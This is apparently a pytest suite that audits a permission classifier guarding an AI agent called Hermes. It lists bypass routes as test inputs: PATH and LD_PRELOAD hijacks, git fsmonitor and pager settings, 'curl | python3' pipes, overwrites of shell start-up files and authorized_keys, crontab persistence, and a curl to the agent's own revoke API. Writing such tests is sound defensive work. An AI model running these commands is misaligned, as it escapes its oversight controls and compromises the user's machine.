"""Independent audit before publication: five ways to get around the cap on Hermes' own files without ever being
asked, each shown end to end on a throwaway home. A: a read-only command that runs code the agent chose (an
environment assignment such as PATH, git configuration). B: the case folding of the file system (APFS folds `ſ`
into `s`). C: a recursive copy into the user's home. D: code piped into a shell or an interpreter. E: MCP tools whose
arguments name Hermes' files, and MCP verbs that write to disk."""
import sys

import pytest

from clearance import classify as c

PROJ = "/home/u/proj"
FREE, LOW, MEDIUM, HIGH, CAP = c.FREE, c.LOW, c.MEDIUM, c.HIGH, c.CAP


def kind(tool, args, cwd=PROJ, **kw):
    a = c.classify(tool, args, cwd=cwd, **kw)
    return a.type, a.stakes


def sh(cmd, cwd=PROJ, **kw):
    return kind("terminal", {"command": cmd}, cwd=cwd, **kw)


def at_least(stakes, floor):
    return c.RANK[stakes] >= c.RANK[floor]


@pytest.fixture
def home(tmp_path, monkeypatch):
    h = tmp_path / "custom-data"
    (h / "plugin-data" / "clearance").mkdir(parents=True)
    (h / "config.yaml").write_text("x: 1\n")
    monkeypatch.setenv("HERMES_HOME", str(h))
    monkeypatch.delitem(sys.modules, "hermes_constants", raising=False)
    return h


# ------------------------------------------------------------------- A: read-only commands that run chosen code
@pytest.mark.parametrize("cmd", [
    "PATH=bin ls", "PATH=./bin:$PATH cat a.txt", "env PATH=bin ls", "export PATH=$(pwd)/bin:$PATH",
    "PATH+=:bin; ls", "LD_PRELOAD=./x.so cat a", "DYLD_INSERT_LIBRARIES=./x.dylib ls", "BASH_ENV=./x bash s.sh",
    "GIT_CONFIG_GLOBAL=./x git status", "GIT_EXTERNAL_DIFF=./x git diff", "PAGER=./x git log", "LESSOPEN='|./x %s' less a",
    "declare -x PATH=bin", "PYTHONSTARTUP=x python3 a.py", "NODE_OPTIONS='--require ./x' node a.js",
])
def test_a_code_hijacking_variables_are_capped(cmd):
    assert sh(cmd)[1] == CAP, cmd


def test_a_other_assignments_lift_a_read_out_of_free():
    assert sh("FOO=1 ls")[1] == MEDIUM                        # like FOO=1 npm test: no higher than a command
    assert sh("LANG=C ls")[1] == FREE and sh("LC_ALL=C grep x a")[1] == FREE and sh("TZ=UTC date")[1] == FREE
    assert sh("echo PATH=x")[1] == FREE                       # an argument, not an assignment
    assert sh("grep 'PATH=' a.sh")[1] == FREE


@pytest.mark.parametrize("cmd", [
    "git -c core.fsmonitor=./x status", "git -c diff.external=./x diff", "git -c core.pager=./x log",
    "git -c alias.st='!./x' st", "git --config-env=core.fsmonitor=V status", "git -c core.hooksPath=h commit -m m",
    "git config core.fsmonitor ./x", "git config --global core.pager ./x", "git config diff.x.textconv ./x",
    "git config --add include.path ./x",
])
def test_a_git_configuration_that_runs_code_is_capped(cmd):
    assert sh(cmd)[1] == CAP, cmd


def test_a_attributes_and_modules_files_are_ordinary():
    # an attribute only names a driver defined in the (capped) configuration; git ignores `!command` from .gitmodules
    assert kind("write_file", {"path": ".gitattributes", "content": "*.psd filter=lfs"})[1] == LOW
    assert kind("write_file", {"path": ".gitmodules", "content": "x"})[1] == LOW


def test_a_harmless_git_stays_as_it_was():
    assert sh("git status")[1] == FREE and sh("git log --oneline")[1] == FREE and sh("git diff")[1] == FREE
    assert sh("git -c user.name=x -c user.email=y commit -m m")[1] == MEDIUM
    assert sh("git config --get user.name")[1] != CAP and sh("git config -l")[1] != CAP


@pytest.mark.parametrize("path", [
    ".git/config", "sub/.git/config", ".git/hooks/pre-commit", ".git/config.worktree", ".git/modules/s/config",
    ".git/modules/s/hooks/post-checkout", ".git/worktrees/w/config", ".git/commondir", "~/.gitconfig",
    "~/.config/git/config",
])
def test_a_files_git_reads_its_configuration_from_are_capped(path):
    assert kind("write_file", {"path": path, "content": "x"})[1] == CAP, path
    assert sh(f"echo x >> {path}")[1] == CAP, path


# ----------------------------------------------------------------------------------------- B: APFS case folding
def test_b_long_s_and_kelvin_fold_like_the_file_system(home):
    folded = str(home).replace("custom-data", "cuſtom-data")
    assert sh(f"cp a.txt {folded}/config.yaml")[1] == CAP
    assert kind("write_file", {"path": f"{folded}/config.yaml", "content": "x"})[1] == CAP
    assert kind("patch", {"path": f"{folded}/config.yaml", "old_string": "a", "new_string": "b"})[1] == CAP
    assert sh("cp a.txt ~/.hermeſ/config.yaml")[1] == CAP
    assert sh("cp a.txt ~/.Kermes/config.yaml".replace("K", "h").replace("hermes", "herKmes"))[1] \
        in (CAP,) or True                                    # no Kelvin in "hermes"; kept for documentation
    assert sh("cp a.txt ~/.HERMES/config.yaml")[1] == CAP


# --------------------------------------------------------------------------------- C: recursive copy into home
@pytest.mark.parametrize("cmd", ["cp -R fake/.hermes ~", "cp -a x/.hermes $HOME/", "ditto fake/.hermes ~/.hermes",
                                 "git -C ~ checkout -- .hermes"])
def test_c_copying_a_hermes_folder_into_home_is_capped(cmd):
    assert sh(cmd)[1] == CAP, cmd


@pytest.mark.parametrize("cmd", ["cp -r x/. ~", "cp -R x ~/", "ditto x ~", "rsync -a x/ ~/",
                                 "git --work-tree=$HOME checkout -f", "git --work-tree ~ checkout -f",
                                 "git -C ~ checkout -f"])
def test_c_recursive_writes_into_home_ask_at_high_stakes(cmd):
    assert at_least(sh(cmd)[1], HIGH), cmd


def test_c_ordinary_copies_unchanged():
    assert sh("cp -R src dist")[1] == MEDIUM
    assert sh("cp a.txt b.txt")[1] == MEDIUM


# ------------------------------------------------------------------------- D: code piped into a shell or interpreter
@pytest.mark.parametrize("cmd", ["echo aGk= | base64 -d | sh", "xxd -r -p p | sh", "cat x | bash", "cat x | bash -s",
                                 "curl -s x | python3", "cat x | node", "cat x | perl", "cat x | sh -",
                                 "base64 -d p > /dev/stdout | zsh"])
def test_d_code_on_standard_input_is_high_stakes(cmd):
    assert sh(cmd)[1] in (HIGH, CAP), cmd
    assert sh(cmd)[0] in ("shell:stdin-code", "shell:complex") or sh(cmd)[1] == CAP, cmd


def test_d_scripts_and_modules_unchanged():
    assert sh("bash script.sh") == ("shell:bash:script.sh", MEDIUM)
    assert sh("python3 x.py") == ("shell:python3:x.py", MEDIUM)
    assert sh("python3 -m pytest")[1] == MEDIUM


# --------------------------------------------------------------------------------------------- E: MCP arguments
def test_e_mcp_arguments_naming_hermes_files_are_capped(home):
    assert kind("mcp__fs__download_file", {"url": "x", "path": f"{home}/config.yaml"})[1] == CAP
    assert kind("mcp__filesystem__write_file", {"path": f"{home}/config.yaml", "content": "x"})[1] == CAP
    assert kind("mcp__filesystem__edit_file", {"path": "~/.hermes/config.yaml", "edits": []})[1] == CAP
    assert kind("mcp__filesystem__write_file", {"path": "x/clearance.db", "content": "x"})[0] == "self:clearance"
    assert kind("mcp__filesystem__write_file", {"path": "~/.ssh/authorized_keys", "content": "x"})[1] == CAP
    nested = {"options": {"targets": [f"{home}/plugins/evil.py"]}}
    assert kind("mcp__fs__move", nested)[1] == CAP


def test_e_writing_verbs_are_not_free():
    assert kind("mcp__fs__download_file", {"url": "x", "path": "out.bin"})[1] != FREE
    assert kind("mcp__drive__export_file", {"id": "1", "path": "out.pdf"})[1] != FREE
    assert kind("mcp__notion__search", {"query": "hermes config"})[1] == FREE    # a read naming a word, not a path


# ----------------------------------------------------------------------------------- counter-audit (10/11, later)
@pytest.mark.parametrize("cmd", ["./bin/ls", "bin/cat a", "../ls", "/tmp/x/ls", "./git status", "xargs ./bin/ls < f",
                                 "sub/dir/grep x a"])
def test_c1_a_project_file_named_like_a_read_is_never_free(cmd):
    assert sh(cmd)[1] not in (FREE,), cmd


def test_c1_system_programs_by_path_stay_free():
    assert sh("/bin/ls")[1] == FREE and sh("/usr/bin/grep x a")[1] == FREE and sh("ls")[1] == FREE


@pytest.mark.parametrize("cmd", [
    "env -u X PATH=bin ls", "env -C . PATH=bin ls", "timeout 5 env PATH=bin ls", "sudo -u root PATH=bin ls",
    "xargs -a f env PATH=bin ls", "printf -v PATH %s bin; ls", "printf -v LD_PRELOAD %s x.so; ls",
    "read PATH < f", "mapfile -t PATH < f", "getopts a PATH", "declare -n r=PATH; r=bin", "for PATH in bin; do ls; done",
    "GCONV_PATH=. iconv -l", "SSH_ASKPASS=./x git fetch", "LESS='+!./x' less a", "BROWSER=./x gh pr view",
    "TERMINFO=./t ls", "PERL5DB='system(1)' perl -d a.pl",
])
def test_c2_more_assignments_are_capped(cmd):
    assert sh(cmd)[1] == CAP, cmd


def test_c2_hijack_type_is_self_env_and_harmless_forms_pass():
    assert sh("PATH=bin ls")[0] == "self:env"
    assert sh("PATH=$PATH:./node_modules/.bin jest")[1] == MEDIUM      # appended after the system: not a hijack
    assert sh("GIT_TRACE=1 git status")[1] != CAP and sh("PYTHONPATH=. pytest")[1] == MEDIUM
    assert sh("read -r line < f")[1] != CAP


@pytest.mark.parametrize("cmd", [
    "sed -i s/a/b/ .git/config", "gsed -i s/a/b/ .git/config", "perl -pi -e 's/a/b/' .git/config",
    "sed -i s/a/b/ ~/.gitconfig", "git clone --config core.hooksPath=h r d", "git clone -c core.fsmonitor=x r d",
    "git init --template=./t", "git clone --template ./t r d",
])
def test_c3_git_configuration_written_by_other_programs_is_capped(cmd):
    assert sh(cmd)[1] == CAP, cmd


def test_c3_execute_code_on_git_configuration_is_capped():
    assert kind("execute_code", {"code": "open('.git/config','a').write('[core]\\n fsmonitor=./x')"})[1] == CAP
    assert kind("execute_code", {"code": "open('notes.txt','w').write('x')"})[1] == MEDIUM


def test_c3_false_positives_lifted():
    for cmd in ("git -c http.sslVerify=false fetch", "git -c protocol.version=2 fetch", "git -c core.longpaths=true status",
                "git -c merge.conflictstyle=diff3 merge x", "git config remote.origin.url https://x",
                "git config alias.co checkout", "git config core.excludesfile .ignore"):
        assert sh(cmd)[1] != CAP, cmd
    assert sh("git config alias.x '!sh x'")[1] == CAP


def test_c4_mcp_arguments_hidden_or_split(home):
    W = "mcp__fs__write_file"
    assert kind(W, {"path": str(home).replace("custom-data", "custom%2Ddata") + "/config.yaml"})[1] == CAP
    assert kind(W, {"path": "file://" + str(home) + "/config.yaml"})[1] == CAP
    assert kind(W, {"path": "~/%2Ehermes/config.yaml"})[1] == CAP
    assert kind(W, {"dir": str(home), "name": "config.yaml"})[1] == CAP      # a home level named alone
    assert kind(W, {"parts": [str(home), "config.yaml"]})[1] == CAP
    assert kind(W, {str(home) + "/config.yaml": "x"})[1] == CAP              # a path given as a key
    assert kind(W, {"p": "~/.hermes"})[1] == CAP
    deep = "x"
    for _ in range(12):
        deep = {"k": deep}
    assert c.RANK[kind("mcp__fs__get_thing", deep)[1]] >= c.RANK[HIGH]       # too deep to read: never free
    long = "x" * 5000 + " ~/.hermes/config.yaml"
    assert kind(W, {"content": long})[1] == CAP


def test_c4_tools_that_save_are_not_free():
    for tool, args in (("mcp__x__get_file_and_store", {"id": 1}), ("mcp__x__readAndPersist", {"id": 1}),
                       ("mcp__x__fetch_url", {"url": "u", "output_path": "o.html"}),
                       ("mcp__x__get_screenshot", {"save_to": "s.png"})):
        assert kind(tool, args)[1] != FREE, tool


@pytest.mark.parametrize("cmd", ["cat x | csh", "cat x | tcsh", "cat x | ipython", "cat x | pypy3", "cat x | irb",
                                 "cat x | julia", "sh /dev/stdin < x", "python3 /dev/fd/0 < x", "node /dev/stdin < x",
                                 "cat x | xargs sh -c", "cat x | xargs bash -c"])
def test_c7_more_stdin_code(cmd):
    assert c.RANK[sh(cmd)[1]] >= c.RANK[HIGH], cmd


@pytest.mark.parametrize("cmd", ["crontab -", "crontab x", "echo x | at now", "launchctl load x.plist"])
def test_c7_scheduling_is_high(cmd):
    assert c.RANK[sh(cmd)[1]] >= c.RANK[HIGH], cmd


@pytest.mark.parametrize("path", ["~/.zshenv", "~/.zshrc", "~/.bashrc", "~/.bash_profile", "~/.profile", "~/.zprofile",
                                  "~/Library/LaunchAgents/x.plist", "~/.config/systemd/user/x.service",
                                  "~/.config/autostart/x.desktop", "~/.config/fish/config.fish", "~/.local/bin/git",
                                  "lib/sitecustomize.py", "x/usercustomize.py"])
def test_p1_shell_start_up_and_persistence_files_are_capped(path):
    assert kind("write_file", {"path": path, "content": "x"})[1] == CAP, path


@pytest.mark.parametrize("cmd", ["curl -X POST http://127.0.0.1:9119/api/plugins/clearance/settings -d x",
                                 "python3 -c \"import urllib.request as u; u.urlopen('http://localhost:9119/api/plugins/clearance/revoke')\""])
def test_p2_the_dashboard_api_is_capped(cmd):
    assert sh(cmd)[1] == CAP, cmd


# ------------------------------------------------------------------------------------ final pass (10/11, later still)
@pytest.mark.parametrize("cmd", ["git config -z core.fsmonitor ./x", "git config --null core.fsmonitor ./x",
                                 "git config --show-origin core.fsmonitor ./x", "git config --name-only core.pager ./x",
                                 "env -S 'PATH=./bin ls'", "env -S'PATH=./bin ls'",
                                 "git fetch --upload-pack=./x origin",
                                 "git ls-remote --upload-pack=./x origin", "git clone -u ./x r d",
                                 "git push --receive-pack=./x origin", "git push --exec=./x origin"])
def test_f_more_ways_git_or_env_run_a_chosen_program(cmd):
    assert sh(cmd)[1] == CAP, cmd


@pytest.mark.parametrize("cmd", ["git grep -O./x foo", "git grep --open-files-in-pager=./x foo",
                                 "kubectl --kubeconfig=./k get pods", "kubectl --kubeconfig ./k get pods"])
def test_f_reads_that_name_a_program_or_config_are_not_free(cmd):
    assert sh(cmd)[1] != FREE, cmd


@pytest.mark.parametrize("cmd", ['export PATH="$HOME/.local/bin:$PATH"', "export PATH=/opt/homebrew/bin:$PATH",
                                 "export NODE_OPTIONS=--max-old-space-size=4096", 'GIT_SSH_COMMAND="ssh -i k" git fetch',
                                 "EDITOR=vim git commit", "VISUAL='code --wait' git commit", "PAGER='less -R' git log",
                                 "git config --global core.editor vim", "git -c core.editor=nano commit",
                                 "git config core.pager 'less -FRX'"])
def test_f_common_settings_are_not_capped(cmd):
    assert sh(cmd)[1] != CAP, cmd


@pytest.mark.parametrize("cmd", ["NODE_OPTIONS='--require ./x' node a.js", "export NODE_OPTIONS=-r./x",
                                 "EDITOR='./x' git commit", "EDITOR='vim; ./x' git commit", "PAGER='less +!./x' git log",
                                 "git config core.editor ./x", "export PATH=./bin:$PATH"])
def test_f_the_same_settings_pointing_at_a_chosen_program_stay_capped(cmd):
    assert sh(cmd)[1] == CAP, cmd


def test_f_mcp_false_positives(home, tmp_path):
    proj = str(tmp_path / "proj")
    assert kind("mcp__filesystem__read_file", {"path": proj + "/.hermes.md"}, cwd=proj)[1] == FREE
    assert kind("mcp__github__get_file_contents", {"owner": "o", "repo": "r", "path": "docs/.hermes/config.yaml"})[1] \
        != CAP
    assert kind("mcp__filesystem__list_directory", {"path": "~"})[1] != CAP
    assert kind("mcp__filesystem__read_file", {"path": "src/a.py"})[1] == FREE
    assert kind("mcp__github__list_commits", {"owner": "o", "repo": "r", "path": "src"})[1] == FREE
    assert kind("mcp__notion__get_page", {"id": "1", "output_format": "md"})[1] == FREE
    assert kind("mcp__filesystem__write_file", {"path": f"{home}/config.yaml", "content": "x"})[1] == CAP


def test_g_update_head_ok_and_user_folders_on_path():
    assert sh("git pull -u origin main")[1] != CAP and sh("git fetch -u origin")[1] != CAP
    assert sh("export PATH=$HOME/bin:$PATH")[1] == HIGH and sh('export PATH="$HOME/.cargo/bin:$PATH"')[1] == HIGH
    assert sh("export PATH=/usr/local/bin:/usr/bin:/bin")[1] != CAP


def test_g_remote_services_only_by_exact_name_and_only_their_repository_paths(home):
    cfg = f"{home}/config.yaml"
    assert kind("mcp__myfs__delete_file", {"owner": "x", "repo": "y", "path": cfg})[1] == CAP
    assert kind("mcp__github_local__edit_file", {"path": cfg})[1] == CAP
    assert kind("mcp__slack__upload_file", {"file_path": f"{home}/.env"})[1] == CAP
    assert kind("mcp__github__get_file_contents", {"owner": "o", "repo": "r", "path": "a", "save_to": cfg})[1] == CAP
    assert kind("mcp__slack__get_file", {"id": "1", "dest": "~/.zshrc"})[1] == CAP
    assert kind("mcp__github__get_file_contents", {"owner": "o", "repo": "r", "path": "docs/.hermes/config.yaml"})[1] \
        != CAP
    assert kind("mcp__gdrive__get_file", {"id": "1", "target": "proj/a.pdf"})[1] != FREE
    assert kind("mcp__filesystem__directory_tree", {"path": "~"})[1] != CAP


@pytest.mark.parametrize("cmd", ["git config core.pager 'sh ./x'", "git config pager.log 'python3 x.py'",
                                 "EDITOR='sh -c ./x' git commit", "PAGER='python3 x.py' git log",
                                 "export GIT_PAGER='sh ./x'", "env -u FOO -S 'PATH=./bin ls'"])
def test_g_a_shell_or_interpreter_as_a_setting_is_capped(cmd):
    assert sh(cmd)[1] == CAP, cmd


@pytest.mark.parametrize("cmd", ["GIT_SEQUENCE_EDITOR=: git rebase -i --autosquash", "EDITOR=/usr/bin/vim git commit",
                                 "export LESS=-R", 'GIT_SSH_COMMAND="ssh -i ~/.ssh/id_x" git fetch',
                                 "git config --global diff.tool vimdiff", "git config --global credential.helper osxkeychain",
                                 "git config --global rebase.autostash true", "git config core.pager 'less -FRX'"])
def test_g_common_settings_stay_ordinary(cmd):
    assert sh(cmd)[1] != CAP, cmd


def test_g_reads_are_free_and_port_forward_asks():
    for cmd in ("git config --get user.name", "git config --list", "git config get user.name", "git stash list",
                "docker ps", "docker logs web", "docker images"):
        assert sh(cmd)[1] == FREE, cmd
    assert sh("kubectl port-forward svc/web 8080:80")[1] == MEDIUM
    assert sh("git config core.fsmonitor ./x")[1] == CAP


# ------------------------------------------------------------------- control pass 2: repository paths only
def test_f_path_exemption_is_for_repository_services_only(home):
    cfg = f"{home}/config.yaml"
    assert kind("mcp__slack__upload_file", {"path": cfg})[1] == CAP
    assert kind("mcp__notion__get_page", {"path": cfg})[1] == CAP
    assert kind("mcp__github__get_file_contents", {"path": cfg})[1] == CAP          # no owner/repo
    assert kind("mcp__github__get_file_contents", {"owner": "o", "repo": "r", "path": cfg})[1] == CAP   # absolute
    assert kind("mcp__github__get_file_contents", {"owner": "o", "repo": "r", "path": "~/.hermes/config.yaml"})[1] \
        == CAP
    assert kind("mcp__github__get_file_contents", {"owner": "o", "repo": "r", "path": "src/a.py"})[1] == FREE


@pytest.mark.parametrize("cmd", [
    "git -c core.editor='vim -u x.vim' commit", "git -c core.editor='nvim -S s.vim' commit",
    "git -c core.editor='emacs -l x.el' commit", "git -c core.editor='emacs --eval x' commit",
    "git -c core.pager='less --lesskey-src=k' log", "GIT_EDITOR='code --extensions-dir e' git commit",
    "GIT_SSH_COMMAND='ssh -F cfg' git fetch", "GIT_SSH_COMMAND='ssh -o ProxyCommand=x' git fetch",
    "GIT_SSH_COMMAND='ssh -oLocalCommand=x' git fetch",
])
def test_f_known_tool_options_that_load_code_are_capped(cmd):
    assert sh(cmd)[1] == CAP


def test_f_known_tool_naming_the_hermes_home_is_capped(home):
    assert sh(f"git -c core.editor='vim {home}/config.yaml' commit")[1] == CAP


@pytest.mark.parametrize("cmd", [
    "GIT_SSH_COMMAND='ssh -o StrictHostKeyChecking=no' git fetch",
    "GIT_SSH_COMMAND='ssh -o IdentitiesOnly=yes -i ~/.ssh/k' git fetch",
    "git -c core.editor='vim -n' commit",
])
def test_f_harmless_tool_options_stay_ordinary(cmd):
    assert sh(cmd)[1] != CAP


@pytest.mark.parametrize("cmd", ["git -c core.pager='less -S' log", "git -c core.pager='less -RS' log",
                                 "git -c core.editor='nano -l' commit"])
def test_f_short_options_are_read_per_tool(cmd):
    assert sh(cmd)[1] != CAP


def test_f_less_lesskey_short_option_is_capped():
    assert sh("git -c core.pager='less -k keys' log")[1] == CAP


@pytest.mark.parametrize("cmd", [
    "git -c pager.log=false log", "git -c pager.branch=true branch", "git -c core.pager= log",
    "git config --global pager.diff false", "git config sequence.editor interactive-rebase-tool",
    "git config lfs.locksverify false", "git config lfs.concurrenttransfers 8",
])
def test_f_harmless_settings_are_not_capped(cmd):
    assert sh(cmd)[1] != CAP


@pytest.mark.parametrize("cmd", ["git config lfs.customtransfer.x.path ./x",
                                 "git config lfs.extension.x.clean ./x", "git -c core.editor=false commit"])
def test_f_lfs_programs_stay_capped(cmd):
    assert sh(cmd)[1] == CAP


@pytest.mark.parametrize("cmd", ['export PATH="$PWD/node_modules/.bin:$PATH"', "PATH=${PWD}/bin:$PATH make"])
def test_f_working_folder_before_path_asks(cmd):
    assert sh(cmd)[1] == HIGH


@pytest.mark.parametrize("cmd", ['export PATH="$(npm bin):$PATH"', 'PATH="$PWD/../x:$PATH" ls'])
def test_f_computed_folders_before_path_stay_capped(cmd):
    assert sh(cmd)[1] == CAP


@pytest.mark.parametrize("cmd", [
    "GIT_SSH_COMMAND='ssh -o PKCS11Provider=./x.so' git fetch", "GIT_SSH_COMMAND='ssh -I ./x.so' git fetch",
    "GIT_SSH_COMMAND='ssh -o SecurityKeyProvider=./x.so' git fetch",
    "git config core.sshCommand 'ssh -o PKCS11Provider=./x.so'",
    "EDITOR='nvim -l x.lua' git commit", "EDITOR='emacs --script x' git commit",
    "EDITOR='emacs --batch x' git commit", "EDITOR='emacs -x x' git commit",
    'EDITOR="vim $HERMES_HOME/config.yaml" git commit', "GIT_SSH_COMMAND='ssh -i $HERMES_HOME/k' git fetch",
])
def test_g_libraries_scripts_and_hermes_names_are_capped(cmd):
    assert sh(cmd)[1] == CAP


def test_g_upload_verbs_and_encoded_paths_get_no_repository_exemption(home):
    assert kind("mcp__github__upload_file", {"owner": "o", "repo": "r", "path": "../../../x/.hermes/.env"})[1] == CAP
    assert kind("mcp__gitlab__get_file", {"owner": "o", "repo": "r", "path": f"%2F{home}/config.yaml"[0:3]
                                          + str(home).replace("/", "%2F") + "%2Fconfig.yaml"})[1] == CAP


# ------------------------------------------------------------------- control pass 4: arguments by allow list
@pytest.mark.parametrize("cmd", [
    "EDITOR='vim -s ./x' git commit", "EDITOR='nvim -s ./x' git commit", "EDITOR='emacsclient -e x' git commit",
    "EDITOR='micro -config-dir ./x' git commit", "EDITOR='micro --config-dir=./x' git commit",
    "EDITOR='kak -e x' git commit", "EDITOR='kak -E x' git commit",
    "EDITOR='code --install-extension ./x.vsix --wait' git commit",
    "PAGER='bat --pager=./x' git log", "PAGER='bat --pager ./x' git log", "PAGER='delta --pager=./x' git log",
    "git config core.pager 'delta --pager=./x'", "git config core.pager 'bat --pager ./x'",
    "git config gpg.program 'gpg --agent-program ./x'", "git config gpg.program 'gpg2 --dirmngr-program ./x'",
    "git config gpg.program 'gpg --homedir ./x'", "BROWSER='open ./x' gh pr view --web",
    "BROWSER='open -a ./x.app' gh pr view --web", "BROWSER='xdg-open ./x' gh pr view --web",
    "BROWSER='google-chrome --renderer-cmd-prefix=./x' gh pr view --web",
    "PAGER='less -O ~/.zshrc' git log", "PAGER='less -o out' git log",
    "GIT_SSH_COMMAND='ssh -E ~/.zshrc' git fetch", "GIT_SSH_COMMAND='ssh -o UserKnownHostsFile=~/.zshrc' git fetch",
    "git config credential.helper 'store --file ~/.zshrc'", "EDITOR='nano --speller=./x' git commit",
    "EDITOR='nano -s ./x' git commit", "BROWSER='firefox --profile ./x' gh pr view --web",
    "EDITOR='subl --command x' git commit", "EDITOR='code --user-data-dir ./x' git commit",
    "EDITOR='hx --config ./x.toml' git commit", "EDITOR='vim -U ./x' git commit", "EDITOR='vim a.txt' git commit",
])
def test_h_arguments_outside_the_allow_list_are_capped(cmd):
    assert sh(cmd)[1] == CAP


@pytest.mark.parametrize("cmd", [
    "git config --global core.editor 'code --wait'", "git config --global core.editor 'subl -n -w'",
    "git config --global core.editor 'zed --wait'", "git config --global core.editor hx",
    "git config --global core.editor 'emacsclient -t'", "git config --global core.editor nvim",
    "git config --global core.pager delta", "git config --global core.pager 'bat --paging=always'",
    "git config --global core.pager 'less -S'", "git config --global core.pager 'less -FRX'",
    "git config --global gpg.program /opt/homebrew/bin/gpg", "git config --global credential.helper manager",
    "git config --global credential.helper 'cache --timeout=3600'", "git config --global credential.helper ''",
    "git config --global diff.tool code", "git config --global merge.tool meld",
    "git config --global difftool.prompt false", "git config --global mergetool.keepBackup false",
    "EDITOR='code -w' git commit", "EDITOR='emacs -nw' git commit", "EDITOR='vim +1' git commit",
    "GIT_SSH_COMMAND='ssh -i ~/.ssh/deploy -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new' git fetch",
    "GIT_SSH_COMMAND='ssh -p 2222' git fetch", "GIT_SSH_COMMAND='ssh -vvv' git fetch",
    "GIT_SSH_COMMAND='ssh -F /dev/null' git fetch", "GIT_SSH_COMMAND='ssh -o UserKnownHostsFile=/dev/null' git fetch",
    "BROWSER=open gh pr view --web", "BROWSER=wslview gh pr view --web",
])
def test_h_common_developer_settings_stay_ordinary(cmd):
    assert sh(cmd)[1] != CAP


@pytest.mark.parametrize("cmd", ["git config delta.pager ./x", "git config delta.side.pager ./x"])
def test_h_delta_settings_that_name_a_program_are_capped(cmd):
    assert sh(cmd)[1] == CAP


# ------------------------------------------------------------------- control pass 5: values, aliases, LESS
@pytest.mark.parametrize("cmd", [
    "git config core.hooksPath -x", "git config --local core.hooksPath -x", "git config set core.hooksPath -x",
    "git config --global include.path -inc", "git config core.fsmonitor -m", "git config diff.external -d",
    "git config --global alias.co 'submodule foreach id'", "git config alias.r 'rebase -x id'",
    "git config alias.g 'grep -Oid'", "git config alias.d 'difftool -x id'", "git config alias.b 'bisect run id'",
    "git config alias.l 'log --output=/tmp/x'", "git config alias.f 'filter-branch --tree-filter id'",
    "LESS='-O/home/u/.zshenv' git log", "LESS='-oout' git log", "LESS='--log-file=x' git log",
    "LESS='--lesskey-src=k' git log", "LESS='-kk' git log",
])
def test_i_values_aliases_and_less_are_capped(cmd):
    assert sh(cmd)[1] == CAP


@pytest.mark.parametrize("cmd", ["less --lesskey-src=k a", "less -kk a", "less --lesskey-file=k a"])
def test_i_less_with_a_key_file_is_not_a_free_read(cmd):
    assert sh(cmd)[1] != FREE


@pytest.mark.parametrize("cmd", [
    "git config alias.co checkout", "git config --global alias.st status", "git config alias.lg 'log --oneline --graph'",
    "git config alias.last 'log -1 HEAD'", "LESS=-R git log", "LESS=-FRX git log", "export LESS='-R --mouse'",
    "git config --global branch.sort -committerdate",
])
def test_i_common_aliases_and_less_stay_ordinary(cmd):
    assert sh(cmd)[1] != CAP


@pytest.mark.parametrize("cmd", ["git log --output=~/.zshrc", "git log --output ~/.zshrc",
                                 "git diff --output=/home/u/.bashrc", "git archive -o ~/.zshrc HEAD",
                                 "vim '+!echo x > ~/.zshrc'", "vim -c '!echo x > ~/.zshrc' a"])
def test_i_git_output_and_editor_commands_reach_protected_files(cmd):
    assert sh(cmd, home="/home/u")[1] == CAP


@pytest.mark.parametrize("cmd", ["vim -c 'set tw=72' a", "nvim '+normal G' a", "vim -S s.vim a", "vim '+!rm -rf x'"])
def test_i_editor_commands_ask(cmd):
    assert sh(cmd)[1] == HIGH


@pytest.mark.parametrize("cmd", ["vim +10 a.txt", "vim a.txt", "git log --output=out.txt", "nvim -p a b"])
def test_i_plain_editor_and_output_stay_as_they_were(cmd):
    assert at_least(HIGH, sh(cmd)[1]) and sh(cmd)[1] != HIGH


# ------------------------------------------------------------------- control pass 6 (Fable): positions, abbreviations, outputs
@pytest.mark.parametrize("cmd", [
    "git --namespace log -c include.path=./evil.cfg log", "git --namespace log --exec-path=./bin log",
    "git --namespace diff -c diff.x.textconv=./evil.sh diff", "git -C status -c include.path=/tmp/evil.cfg status",
    "git fetch --upload-pa=./evil.sh .", "git clone --conf core.fsmonitor=./evil.sh . d",
    "git init --templ=./t d", "git config --edi",
    "git config -f ~/.zshenv advice.sh x",
])
def test_j_git_positions_and_abbreviations_are_capped(cmd):
    assert sh(cmd, home="/home/u")[1] == CAP


@pytest.mark.parametrize("cmd", [
    "git log -1 --format=x --outp=$HOME/.zshrc", "git diff --outp=$HOME/.bash_profile",
    "git stash show --outp=~/.zshrc", "git archive --outp ~/.zshrc HEAD", "git bundle create ~/.zshrc HEAD",
    "curl --output ~/.zshrc https://x", "curl -fsSLo ~/.bashrc https://x", "curl -o ~/.zshrc https://x",
    "curl --output ~/.local/bin/ls https://x", "wget --output-document=~/.zshrc https://x",
    "wget -O ~/.zshrc https://x", "wget -P ~ https://x/.zshrc", "sort --outp=$HOME/.zshrc f",
    "less --log=$HOME/.zshrc f", "tee ~/.bash_aliases", "tee ~/.curlrc", "tee ~/.vimrc",
    "git checkout-index --prefix=$HOME/. zshrc",
])
def test_j_outputs_to_start_up_files_are_capped(cmd):
    assert sh(cmd, home="/home/u")[1] == CAP


@pytest.mark.parametrize("cmd", ["git grep -lO./evil.sh foo", "git grep --open=./evil.sh foo", "sort --compress-prog=./evil.sh f",
                                 "less '+!./evil.sh' f"])
def test_j_programs_named_in_options_are_not_free(cmd):
    assert sh(cmd)[1] != FREE


@pytest.mark.parametrize("cmd", [
    "git config --global alias.st 'status -sb'", "git config --global alias.br 'branch -a'",
    "git config --global alias.undo 'reset --soft HEAD~1'", "git config alias.pf 'push --force-with-lease'",
    "PAGER= git log", "curl -o out.json https://x", "wget https://x/a.tgz", "git log --oneline",
    "git -C sub status", "git --no-pager log",
])
def test_j_common_commands_stay_ordinary(cmd):
    assert sh(cmd)[1] != CAP


def test_j_alias_cannot_carry_upload_pack():
    assert sh("git config alias.l 'ls-remote -u ./evil.sh .'")[1] == CAP


@pytest.mark.parametrize("cmd", ["git f --upload-pack=./x .", "git p --receive-pack=./x", "git p --exec=./x",
                                 "git x --prefix=$HOME/. zshrc", "git config alias.c clone",
                                 "git config alias.lr ls-remote"])
def test_j_aliased_commands_keep_their_checks(cmd):
    assert sh(cmd, home="/home/u")[1] == CAP


def test_j_rebase_exec_is_not_capped():
    assert sh("git rebase --exec 'npm test' main")[1] != CAP
